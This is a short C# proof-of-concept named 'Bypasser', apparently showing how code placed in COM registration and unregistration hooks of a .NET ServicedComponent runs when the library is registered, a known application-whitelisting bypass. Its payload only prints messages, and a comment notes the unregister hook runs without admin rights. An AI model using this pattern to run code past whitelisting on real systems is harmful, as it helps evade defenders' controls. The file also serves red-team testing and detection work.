using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;



/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

Create Your Strong Name Key -> key.snk

C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /target:library /out:example.dll /keyfile:key.snk example.cs


*/

[ assembly: ApplicationName("Bypasser")]
//[ assembly: ApplicationID("4fb2d46f-efc8-4643-bcd0-6e5bfa6a174c")] 
namespace Delivery
{
	[GuidAttribute("4fb2d46f-efc8-4643-bcd0-6e5bfa6a174c")]
    public class Bypass : ServicedComponent
    {
        public Bypass() { Console.WriteLine("I am a basic COM Object"); }

        [ComRegisterFunction] //This executes if registration is successful
        public static void RegisterClass(string key)
        {
            Console.WriteLine("Hey From Register!");
        }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            Console.WriteLine("Hey From UnRegister!"); //This runs if you don't have Admin Permissions ;-)
        }
    }

}
